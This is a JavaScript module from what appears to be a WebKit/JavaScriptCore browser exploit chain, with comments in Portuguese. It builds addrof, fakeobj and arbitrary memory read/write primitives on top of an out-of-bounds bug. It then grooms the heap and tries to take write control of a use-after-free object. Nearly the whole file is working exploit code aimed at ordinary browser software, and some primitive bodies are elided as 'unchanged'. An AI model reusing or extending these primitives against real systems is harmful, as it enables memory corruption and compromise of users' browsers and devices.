// js/script3/testArrayBufferVictimCrash.mjs (v04 - Verificação de Escrita em Objeto UAF)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// 1. O diagnóstico da UAF foi concluído na v03. O objetivo agora é CONTROLE.
// 2. Após induzir a UAF, tentaremos ESCREVER um valor padrão em uma propriedade do objeto
//    corrompido ('target_obj').
// 3. Em seguida, usaremos a leitura arbitrária para VERIFICAR se o valor foi escrito na
//    memória adjacente, provando que temos um objeto UAF estável para L/E.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R91_IterativeCrashDebug";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// Função auxiliar para obter offsets de forma segura
function getSafeOffset(baseObject, path, defaultValue = 0) {
    // ... (código inalterado) ...
    let current = baseObject;
    const parts = path.split('.');
    let fullPath = '';
    for (let i = 0; i < parts.length; i++) {
        const part = parts[i];
        fullPath += (fullPath ? '.' : '') + part;
        if (current && typeof current === 'object' && part in current) {
            current = current[part];
        } else {
            return defaultValue;
        }
    }
    if (typeof current === 'number') return current;
    if (typeof current === 'string' && String(current).startsWith('0x')) return parseInt(String(current), 16) || defaultValue;
    return defaultValue;
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: v04 - Verificação de Escrita em Objeto UAF ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou ou vazamento WebKit falhou.",
        webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
    };

    const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);

    try {
        // Fases 1-4: Obtenção das primitivas L/E. Permanece inalterado.
        logS3("PAUSA INICIAL: Aguardando carregamento completo do ambiente e offsets.", "info");
        await PAUSE_S3(1000);

        const LOCAL_JSC_OFFSETS = { /* ... (código inalterado) ... */ 
            JSCell_STRUCTURE_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_POINTER_OFFSET'),
            JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'),
            ArrayBufferView_M_LENGTH_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.M_LENGTH_OFFSET'),
            ArrayBuffer_DATA_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START'),
        };
        // ... Validação de offsets ...
        
        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        // ... Verificação OOB ...

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => { /* ... (código inalterado) ... */ victim_array[0] = obj; return doubleToInt64(confused_array[0]); };
        const fakeobj = (addr) => { /* ... (código inalterado) ... */ confused_array[0] = int64ToDouble(addr); return victim_array[0]; };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");
        // ... Verificação addrof/fakeobj ...

        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        const arb_read_final = (addr) => { /* ... (código inalterado) ... */ leaker.obj_prop = fakeobj(addr); return doubleToInt64(leaker.val_prop); };
        const arb_write_final = (addr, value) => { /* ... (código inalterado) ... */ leaker.obj_prop = fakeobj(addr); leaker.val_prop = int64ToDouble(value); };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        logS3("--- FASE 4: Verificando L/E... ---", "subtest");
        const test_obj_for_rw_verification = {a:1};
        const test_obj_for_rw_verification_addr = addrof(test_obj_for_rw_verification);
        const prop_addr = test_obj_for_rw_verification_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
        arb_write_final(prop_addr, NEW_POLLUTION_VALUE);
        const value_read_for_verification = arb_read_final(prop_addr);
        if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
            logS3("+++++++++++ SUCESSO! L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
        } else {
            throw new Error(`A verificação de L/E falhou.`);
        }

        // --- FASE 5: NOVA ESTRATÉGIA - EXPLORAÇÃO E CONTROLE DA UAF ---
        logS3("--- FASE 5: Explorando a UAF para obter controle de escrita ---", "subtest");

        const testes_ativos = { tentativa_5_UAF_Control: true };
        
        // Função de grooming permanece a mesma que causou a condição original
        const do_grooming = async (grooming_id) => {
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Executando Heap Grooming...`, "info");
            let aggressive_feng_shui_objects = [];
            for (let i = 0; i < 75000; i++) { aggressive_feng_shui_objects.push(new ArrayBuffer(Math.floor(Math.random() * 256) + 64)); if (i % 1000 === 0) aggressive_feng_shui_objects.push({}); }
            for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
            let filler_objects = [];
            for (let i = 0; i < 15000; i++) { filler_objects.push(new Uint32Array(Math.floor(Math.random() * 64) + 16)); }
            aggressive_feng_shui_objects = null;
            filler_objects = null;
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Pausando para acionar GC...`, "debug");
            await PAUSE_S3(5000); // Pausa reduzida para acelerar o teste
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Concluído.`, "debug");
        };

        if (testes_ativos.tentativa_5_UAF_Control) {
            logS3("--- INICIANDO TENTATIVA 5 (v04): Controle de Objeto UAF ---", "test");
            
            await do_grooming(5);

            logS3("Grooming concluído. Tentando criar e manipular objeto UAF.", "info");

            try {
                const UAF_WRITE_PATTERN = new AdvancedInt64(0xABCD1234, 0x5678EFAB);
                
                // 1. Criar o objeto alvo, que deve ser alocado na memória corrompida.
                const target_obj = { original_prop: 1337 };
                const target_obj_addr = addrof(target_obj);
                logS3(`Endereço do objeto alvo UAF: ${target_obj_addr.toString(true)}`, "info");

                // 2. Tentar escrever no objeto corrompido. Esta operação pode crashar.
                logS3(`Tentando escrever o padrão ${UAF_WRITE_PATTERN.toString(true)} em uma propriedade do objeto UAF...`, "info");
                target_obj.uaf_property = int64ToDouble(UAF_WRITE_PATTERN);
                logS3("Escrita no objeto UAF não crashou (bom sinal!). Verificando a memória agora...", "good");

                // 3. Verificar se a escrita funcionou varrendo a memória adjacente.
                let found = false;
                const SCAN_RANGE = 0x80; // Varre 128 bytes antes e depois
                logS3(`Varrendo memória de -${toHex(SCAN_RANGE)} a +${toHex(SCAN_RANGE)} ao redor do endereço do objeto...`, "debug");

                for (let offset = -SCAN_RANGE; offset <= SCAN_RANGE; offset += 8) {
                    const current_addr = target_obj_addr.add(offset);
                    const read_val = arb_read_final(current_addr);

                    if (read_val.equals(UAF_WRITE_PATTERN)) {
                        logS3(`++++++++++++ SUCESSO TOTAL! OBJETO UAF ESTÁVEL PARA ESCRITA ENCONTRADO! ++++++++++++`, "vuln");
                        logS3(`Padrão ${UAF_WRITE_PATTERN.toString(true)} escrito com sucesso e encontrado no offset ${toHex(offset)}`, "vuln");
                        found = true;
                        final_result.success = true;
                        final_result.message = "Controle de escrita sobre objeto UAF foi verificado com sucesso.";
                        final_result.webkit_leak_details = { success: true, msg: "Primitiva de controle UAF estabelecida." };
                        break; 
                    }
                }

                if (!found) {
                    throw new Error("Padrão de escrita não foi encontrado na memória adjacente ao objeto UAF.");
                }

            } catch (uaf_control_e) {
                logS3(`Falha na tentativa de controle do objeto UAF: ${uaf_control_e.message}`, "critical");
                final_result.message = `Falha na tentativa de controle do objeto UAF: ${uaf_control_e.message}`;
            }
        }

    } catch (e) {
        final_result.message = `Exceção crítica na cadeia de exploração: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
